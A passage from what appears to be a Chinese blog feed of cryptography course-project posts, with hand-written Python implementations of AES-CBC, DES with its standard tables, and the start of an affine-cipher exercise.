range(0,len(str)/4):</div><div class="line">        key_i = str[i*4:i*4+4]</div><div class="line">        key_i = str_to_bin(key_i)</div><div class="line">        k_list.append(key_i)</div><div class="line">    for i in range(1,11):</div><div class="line">        key_i = str_xor(FuncT(k_list[i*4-1],i),k_list[i*4-4])</div><div class="line">        k_list.append(key_i)</div><div class="line">        key_i = str_xor(key_i,k_list[i*4-3])</div><div class="line">        k_list.append(key_i)</div><div class="line">        key_i = str_xor(key_i,k_list[i*4-2])</div><div class="line">        k_list.append(key_i)</div><div class="line">        key_i = str_xor(key_i,k_list[i*4-1])</div><div class="line">        k_list.append(key_i)</div><div class="line">    return k_list</div></pre></td></tr></table></figure><h3 id="T函数"><a href="#T函数" class="headerlink" title="T函数"></a>T函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">def FuncT(str,i):</div><div class="line">    ans = str[8:] + str[:8]</div><div class="line">    ans = s_box(ans)</div><div class="line">    Rcon_list = [&quot;00000001000000000000000000000000&quot;,</div><div class="line">                 &quot;00000010000000000000000000000000&quot;,</div><div class="line">                 &quot;00000100000000000000000000000000&quot;,</div><div class="line">                 &quot;00001000000000000000000000000000&quot;,</div><div class="line">                 &quot;00010000000000000000000000000000&quot;,</div><div class="line">                 &quot;00100000000000000000000000000000&quot;,</div><div class="line">                 &quot;01000000000000000000000000000000&quot;,</div><div class="line">                 &quot;10000000000000000000000000000000&quot;,</div><div class="line">                 &quot;00011011000000000000000000000000&quot;,</div><div class="line">                 &quot;00110110000000000000000000000000&quot;]</div><div class="line">    return str_xor(ans,Rcon_list[i-1])</div></pre></td></tr></table></figure><h3 id="iv生成器"><a href="#iv生成器" class="headerlink" title="iv生成器"></a>iv生成器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def rand_iv():</div><div class="line">    iv = &quot;&quot;</div><div class="line">    range_iv = &quot;ZBCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</div><div class="line">    for i in range(0,16):</div><div class="line">        iv += range_iv[random.randint(0,61)]</div><div class="line">    return iv</div></pre></td></tr></table></figure><h3 id="单组AES-CBC加密"><a href="#单组AES-CBC加密" class="headerlink" title="单组AES-CBC加密"></a>单组AES-CBC加密</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">def AES_CBC_encode(str,key,str_iv):</div><div class="line">    key_list = key</div><div class="line">    for i in range(0,16-len(str)):</div><div class="line">        str = str + &apos;0&apos;</div><div class="line">    iv_bin = str_iv</div><div class="line">    mw_str_bin =str_to_bin(str)</div><div class="line">    code_m = str_xor(iv_bin,mw_str_bin)</div><div class="line">    code = &quot;&quot;</div><div class="line">    key_i = &quot;&quot;</div><div class="line">    for i in range(0,4):</div><div class="line">        code = code + code_m[i*8:i*8+8] + code_m[i*8+32:i*8+40] + code_m[i*8+64:i*8+72] + code_m[i*8+96:i*8+104]</div><div class="line">        key_i = key_i + key_list[0][i*8:i*8+8] + key_list[1][i*8:i*8+8] + key_list[2][i*8:i*8+8] + key_list[3][i*8:i*8+8]</div><div class="line">    codem = str_xor(key_i,code)</div><div class="line">    for i in range(1,10):</div><div class="line">        codem = s_box(codem)</div><div class="line">        codem = hmove(codem)</div><div class="line">        codem = list_en(codem)</div><div class="line">        key_i = &quot;&quot;</div><div class="line">        for j in range(0,4):</div><div class="line">            key_i = key_i + key_list[i*4][j*8:j*8+8] + key_list[i*4+1][j*8:j*8+8] + key_list[i*4+2][j*8:j*8+8] + key_list[i*4+3][j*8:j*8+8]</div><div class="line">        codem = str_xor(codem,key_i)</div><div class="line">    codem = s_box(codem)</div><div class="line">    codem = hmove(codem)</div><div class="line">    key_i = &quot;&quot;</div><div class="line">    for j in range(0,4):</div><div class="line">        key_i = key_i + key_list[40][j*8:j*8+8] + key_list[41][j*8:j*8+8] + key_list[42][j*8:j*8+8] + key_list[43][j*8:j*8+8]</div><div class="line">    codem = str_xor(codem,key_i)</div><div class="line">    code = &quot;&quot;</div><div class="line">    for i in range(0,4):</div><div class="line">        code = code + codem[i*8:i*8+8] + codem[i*8+32:i*8+40] + codem[i*8+64:i*8+72] + codem[i*8+96:i*8+104]</div><div class="line">    code = bin_to_str(code)</div><div class="line">    return code</div></pre></td></tr></table></figure><h3 id="单组AES-CBC解密"><a href="#单组AES-CBC解密" class="headerlink" title="单组AES-CBC解密"></a>单组AES-CBC解密</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">def AES_CBC_decode(str,iv_bin,key):</div><div class="line">    key_list = key</div><div class="line">    codem = str_to_bin(str)</div><div class="line">    code = &quot;&quot;</div><div class="line">    key_i = &quot;&quot;</div><div class="line">    for i in range(0,4):</div><div class="line">        code = code + codem[i*8:i*8+8] + codem[i*8+32:i*8+40] + codem[i*8+64:i*8+72] + codem[i*8+96:i*8+104]</div><div class="line">        key_i = key_i + key_list[40][i*8:i*8+8] + key_list[41][i*8:i*8+8] + key_list[42][i*8:i*8+8] + key_list[43][i*8:i*8+8]</div><div class="line">    code = str_xor(key_i,code)</div><div class="line">    for i in range(1,10):</div><div class="line">        key_i = &quot;&quot;</div><div class="line">        for j in range(0,4):</div><div class="line">            key_i = key_i + key_list[(10-i)*4][j*8:j*8+8] + key_list[(10-i)*4+1][j*8:j*8+8] + key_list[(10-i)*4+2][j*8:j*8+8] + key_list[(10-i)*4+3][j*8:j*8+8]</div><div class="line">        code = re_hmove(code)</div><div class="line">        code = re_s_box(code)</div><div class="line">        code = str_xor(key_i,code)</div><div class="line">        code = re_list_en(code)</div><div class="line">    code = re_hmove(code)</div><div class="line">    code = re_s_box(code)</div><div class="line">    key_i = &quot;&quot;</div><div class="line">    for i in range(0,4):</div><div class="line">        key_i = key_i + key_list[0][i*8:i*8+8] + key_list[1][i*8:i*8+8] + key_list[2][i*8:i*8+8] + key_list[3][i*8:i*8+8]</div><div class="line">    code = str_xor(key_i,code)</div><div class="line">    code_m = &quot;&quot;</div><div class="line">    for i in range(0,4):</div><div class="line">        code_m = code_m + code[i*8:i*8+8] + code[i*8+32:i*8+40] + code[i*8+64:i*8+72] + code[i*8+96:i*8+104]</div><div class="line">    code = str_xor(code_m,iv_bin)</div><div class="line">    code = bin_to_str(code)</div><div class="line">    return code</div></pre></td></tr></table></figure><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>写的太乱了，全程以二进制形式跑，也不知道效率怎么样。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h2&gt;&lt;p&gt;基于CBC模式的一组明文的加密，对于文件加密的操作遇到点问题，加密之后的密文转成字符串以文本的形式输入文件会出现中文乱码，然后解密的时候只会
      
    
    </summary>
    
      <category term="Crypto" scheme="http://yoursite.com/categories/Crypto/"/>
    
    
      <category term="密码学课程设计" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="AES_CBC" scheme="http://yoursite.com/tags/AES-CBC/"/>
    
  </entry>
  
  <entry>
    <title>密码学课程设计二-DES密码</title>
    <link href="http://yoursite.com/2017/12/26/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%BA%8C-DES%E5%AF%86%E7%A0%81/"/>
    <id>http://yoursite.com/2017/12/26/密码学课程设计二-DES密码/</id>
    <published>2017-12-26T15:12:44.000Z</published>
    <updated>2017-12-26T16:27:44.977Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理简介"><a href="#原理简介" class="headerlink" title="原理简介"></a>原理简介</h2><p>对于每个分组（8个字节64bite），先对其进行初始置换，然后迭代16圈，每一圈使用不同的密钥，最后再对结果进行逆初始置换得到密文。</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1,将8个字节转换位二进制</p><p>2，初始置换</p><p>3，输入的右32位作为输出的左32位</p><p>4，输入的右32位和圈密钥k进行f函数运算后和输入的左32位异或的结果作为输出的右32位</p><p>5，重复步骤3、4，14次</p><p>6，第16次直接将输入的右32位作为输出的右32位，再将输入的右32位和密钥k经过f函数处理后，再与输入的左32位异或的结果作为输出的左32位</p><p>7，得到的结果再进行逆初始置换，得到密文</p><h3 id="圈密钥生成"><a href="#圈密钥生成" class="headerlink" title="圈密钥生成"></a>圈密钥生成</h3><p>密钥是8个字节，先转为2进制得到64比特，再进行置换选择1，得到56位的有效密钥（8,16,24,32,40,48,56,64位为奇偶校验位）</p><p>再把56位有效密钥分成左28位Ci和右28位Di</p><p>分别对Ci和Di进行循环左移,得到Ci+1和Di+1（第1,2,9,16次移动为1位，其余为2位），一共16次</p><p>对每次移位得到的结果进行置换选择2，得到48位的密钥Ki</p><h3 id="f函数"><a href="#f函数" class="headerlink" title="f函数"></a>f函数</h3><p><img src="/uploads/roundf.jpg" alt="f_fun"></p><p>1，先对右32位输入进行E盒运算得到48位输出</p><p>2，再把运算结果和48位的圈密钥进行异或之后输入到s1,s2…s8盒中</p><p>3，每个S盒都是6进4出（输入为6比特，输出4比特），综合得到32位输出</p><p>4，把结果输入到P盒中，进行P盒置换，最后得到32位输出</p><h4 id="E盒"><a href="#E盒" class="headerlink" title="E盒"></a>E盒</h4><p>把32位比特拓展为48比特,把输入的32比特从左到右编号为1,2,3。。。32，并把 这32比特写成每行4个，共8行的形式。然后把第i-1行最右比特和第i+1行最左比特添加到第i行的左边和右边</p><p><img src="/uploads/E_box.jpg" alt="e_box"></p><p>得到48位输出</p><h4 id="S盒"><a href="#S盒" class="headerlink" title="S盒"></a>S盒</h4><p>将48比特数据压缩为32比特，一共有八个S盒，每个S盒依次对应压缩6个比特，输出4个比特，8个S盒一共输出32比特</p><p><img src="/uploads/s_box.jpg" alt="s_box"></p><p>每个S盒对应的6个比特b1b2b3b4b5b6中，b1b6组成的二进制表示行标，b2b3b4b5组成的二进制表示列标，然后将对应位置的十进制数字转为二进制作为输出</p><h4 id="P盒"><a href="#P盒" class="headerlink" title="P盒"></a>P盒</h4><p>一个简单的置换</p><p><img src="/uploads/p_box.jpg" alt="p_box"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="转为二进制"><a href="#转为二进制" class="headerlink" title="转为二进制"></a>转为二进制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">def str_to_bin(str):</div><div class="line">    bins = &quot;&quot;</div><div class="line">    for i in range(0,8-len(str)):</div><div class="line">        str = str + &apos;0&apos;</div><div class="line">    for i in str:</div><div class="line">        a_bin = bin(ord(i))[2:]</div><div class="line">        for j in range(0,8-len(a_bin)):</div><div class="line">            a_bin = &apos;0&apos; + a_bin</div><div class="line">        bins += a_bin</div><div class="line">    return bins</div></pre></td></tr></table></figure><h3 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">def fmove(str):</div><div class="line">    M_list = [58,50,42,34,26,18,10,2,</div><div class="line">              60,52,44,36,28,20,12,4,</div><div class="line">              62,54,46,38,30,22,14,6,</div><div class="line">              64,56,48,40,32,24,16,8,</div><div class="line">              57,49,41,33,25,17,9,1,</div><div class="line">              59,51,43,35,27,19,11,3,</div><div class="line">              61,53,45,37,29,21,13,5,</div><div class="line">              63,55,47,39,31,23,15,7]</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in M_list:</div><div class="line">        ans += str[i-1]</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="逆初始置换"><a href="#逆初始置换" class="headerlink" title="逆初始置换"></a>逆初始置换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">def remove(str):</div><div class="line">    rM_list = [40,8,48,16,56,24,64,32,</div><div class="line">               39,7,47,15,55,23,63,31,</div><div class="line">               38,6,46,14,54,22,62,30,</div><div class="line">               37,5,45,13,53,21,61,29,</div><div class="line">               36,4,44,12,52,20,60,28,</div><div class="line">               35,3,43,11,51,19,59,27,</div><div class="line">               34,2,42,10,50,18,58,26,</div><div class="line">               33,1,41,9,49,17,57,25]</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in rM_list:</div><div class="line">        ans += str[i-1]</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="字符串异或"><a href="#字符串异或" class="headerlink" title="字符串异或"></a>字符串异或</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">def str_xor(str1,str2):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,len(str1)):</div><div class="line">        i_ans = int(str1[i])^int(str2[i])</div><div class="line">        if i_ans == 1:</div><div class="line">            ans += &apos;1&apos;</div><div class="line">        else:</div><div class="line">            ans += &apos;0&apos;</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="圈密钥生成-1"><a href="#圈密钥生成-1" class="headerlink" title="圈密钥生成"></a>圈密钥生成</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">def getkey(str):</div><div class="line">    ans1 = &quot;&quot;</div><div class="line">    k1_list = [57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4]</div><div class="line">    k2_list = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32]</div><div class="line">    for i in k1_list:</div><div class="line">        ans1 += str[i-1]</div><div class="line">    Ci = ans1[:28]</div><div class="line">    Di = ans1[28:]</div><div class="line">    ans_list = []</div><div class="line">    for i in range(1,17):</div><div class="line">        if (i!=1) and (i!=2) and (i!=9) and (i!=16):</div><div class="line">            Ci = Ci[2:] + Ci[:2]</div><div class="line">            Di = Di[2:] + Di[:2]</div><div class="line">        else:</div><div class="line">            Ci = Ci[1:] + Ci[:1]</div><div class="line">            Di = Di[1:] + Di[:1]</div><div class="line">        keyi = &quot;&quot;</div><div class="line">        CDi = Ci + Di</div><div class="line">        for i in k2_list:</div><div class="line">            keyi += CDi[i-1]</div><div class="line">        ans_list.append(keyi)</div><div class="line">    return ans_list</div></pre></td></tr></table></figure><h3 id="E盒-1"><a href="#E盒-1" class="headerlink" title="E盒"></a>E盒</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">def e_box(str):</div><div class="line">    e_list = [32, 1, 2, 3, 4, 5,</div><div class="line">               4, 5, 6, 7, 8, 9,</div><div class="line">               8, 9,10,11,12,13,</div><div class="line">              12,13,14,15,16,17,</div><div class="line">              16,17,18,19,20,21,</div><div class="line">              20,21,22,23,24,25,</div><div class="line">              24,25,26,27,28,29,</div><div class="line">              28,29,30,31,32, 1]</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in e_list:</div><div class="line">        ans += str[i-1]</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="S盒-1"><a href="#S盒-1" class="headerlink" title="S盒"></a>S盒</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">def s_box(str):</div><div class="line">    s_list = [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13],</div><div class="line">              [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9],</div><div class="line">              [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12],</div><div class="line">              [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14],</div><div class="line">              [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3],</div><div class="line">              [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13],</div><div class="line">              [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12],</div><div class="line">              [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]]</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,8):</div><div class="line">        str_i = str[i*6:i*6+6]</div><div class="line">        str_h = int(str_i[0]+str_i[5],2)</div><div class="line">        str_l = int(str_i[1:5],2)</div><div class="line">        i_ans = bin(s_list[i][str_h*16+str_l])[2:]</div><div class="line">        for j in range(0,4-len(i_ans)):</div><div class="line">            i_ans = &apos;0&apos;+i_ans</div><div class="line">        ans += i_ans</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="P盒-1"><a href="#P盒-1" class="headerlink" title="P盒"></a>P盒</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def p_box(str):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    p_list = [16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25]</div><div class="line">    for i in p_list:</div><div class="line">        ans += str[i-1]</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="f函数-1"><a href="#f函数-1" class="headerlink" title="f函数"></a>f函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def round_f(str,key):</div><div class="line">    str_e = e_box(str)</div><div class="line">    str_e_xork = str_xor(str_e,key)</div><div class="line">    str_s = s_box(str_e_xork)</div><div class="line">    ans = p_box(str_s)</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="其他部分"><a href="#其他部分" class="headerlink" title="其他部分"></a>其他部分</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">def Encode_des(str,key):</div><div class="line">    str_key = str_to_bin(key)</div><div class="line">    key_list = getkey(str_key)</div><div class="line">    m = str_to_bin(str)</div><div class="line">    code = fmove(m)</div><div class="line">    key = &quot;&quot;</div><div class="line">    strl = code[:32]</div><div class="line">    strr = code[32:]</div><div class="line">    for i in range(0, 15):</div><div class="line">        key = key_list[i]</div><div class="line">        strm = strr</div><div class="line">        strl_f = round_f(strr,key)</div><div class="line">        strr = str_xor(strl_f,strl)</div><div class="line">        strl = strm</div><div class="line">    code_r = strr</div><div class="line">    code_m = round_f(strr,key_list[15])</div><div class="line">    code_l = str_xor(code_m,strl)</div><div class="line">    code = code_l + code_r</div><div class="line">    code = remove(code)</div><div class="line">    return code</div><div class="line"></div><div class="line">def Decode_des(str,key):</div><div class="line">    key = str_to_bin(key)</div><div class="line">    key_list = getkey(key)</div><div class="line">    code = fmove(str)</div><div class="line">    code_l = code[:32]</div><div class="line">    code_r = code[32:]</div><div class="line">    for i in range(0,15):</div><div class="line">        key = key_list[15-i]</div><div class="line">        code_m = code_r</div><div class="line">        code_f = round_f(code_r,key)</div><div class="line">        code_r = str_xor(code_l,code_f)</div><div class="line">        code_l = code_m</div><div class="line">    m_strl = str_xor(code_l,round_f(code_r,key_list[0]))</div><div class="line">    m_strr = code_r</div><div class="line">    m_str = m_strl + m_strr</div><div class="line">    m_str = remove(m_str)</div><div class="line">    str_m = &quot;&quot;</div><div class="line">    for i in range(0,len(m_str),8):</div><div class="line">        str_m += chr(int(m_str[i:i+8],2))</div><div class="line">    str_m = str_m.strip(&apos;0&apos;)</div><div class="line">    return str_m</div><div class="line"></div><div class="line">def ECB_des_Encode(str,key):</div><div class="line">    code = &quot;&quot;</div><div class="line">    for i in range(0,len(str),8):</div><div class="line">        code += Encode_des(str[i:i+8],key)</div><div class="line">    return code</div><div class="line"></div><div class="line">def ECB_des_Decode(str,key):</div><div class="line">    mingwen = &quot;&quot;</div><div class="line">    i = 0</div><div class="line">    while str[i:i+64] != &quot;&quot;:</div><div class="line">        mingwen += Decode_des(str[i:i+64],key)</div><div class="line">        i = i + 64</div><div class="line">    return mingwen</div><div class="line"></div><div class="line">key = raw_input(&quot;input key:&quot;)</div><div class="line">f = file(&quot;miwen.txt&quot;,&quot;w+&quot;)</div><div class="line">for line in open(&quot;test.txt&quot;):</div><div class="line">    f.writelines(ECB_des_Encode(line, key))</div><div class="line">print &quot;Encode is OK!&quot;</div><div class="line">key = raw_input(&quot;input key:&quot;)</div><div class="line">f = file(&quot;mingwen.txt&quot;,&quot;w+&quot;)</div><div class="line">for line in open(&quot;miwen.txt&quot;):</div><div class="line">    f.writelines(ECB_des_Decode(line,key))</div><div class="line">print &quot;Decode is OK!&quot;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原理简介&quot;&gt;&lt;a href=&quot;#原理简介&quot; class=&quot;headerlink&quot; title=&quot;原理简介&quot;&gt;&lt;/a&gt;原理简介&lt;/h2&gt;&lt;p&gt;对于每个分组（8个字节64bite），先对其进行初始置换，然后迭代16圈，每一圈使用不同的密钥，最后再对结果进行逆初始置换得
      
    
    </summary>
    
      <category term="Crypto" scheme="http://yoursite.com/categories/Crypto/"/>
    
    
      <category term="密码学课程设计" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="DES" scheme="http://yoursite.com/tags/DES/"/>
    
  </entry>
  
  <entry>
    <title>密码学课程设计实验一</title>
    <link href="http://yoursite.com/2017/12/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
    <id>http://yoursite.com/2017/12/20/密码学课程设计实验一/</id>
    <published>2017-12-20T00:57:39.000Z</published>
    <updated>2017-12-20T01:01:05.859Z</updated>
    
    <content type="html"><![CDATA[<h2 id="仿射密码-加密，解密，暴力破解"><a href="#仿射密码-加密，解密，暴力破解" class="headerlink" title="仿射密码(加密，解密，暴力破解)"></a>仿射密码(加密，解密，暴力破解)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">def get_k3(k1):</div><div class="line">    for k3 in range(0,26):</div><div class="line">if (k3*k1)%26 == 1:</div><div class="line">return k3</div><div class="line"></div><div class="line">def get_code(m,k1,k2):</div><div class="line">c = &quot;&quot;</div><div class="line">for i in m:</div><div class="line">if ord(i) &gt;= 97:</div><div class="line">c += chr((k1 * (ord(i) - 97) + k2) % 26 + 97)</div><div class="line">else:</div><div class="line">c += chr((k1 * (ord(i) - 65) + k2) % 26 + 65)</div><div class="line">return c</div><div 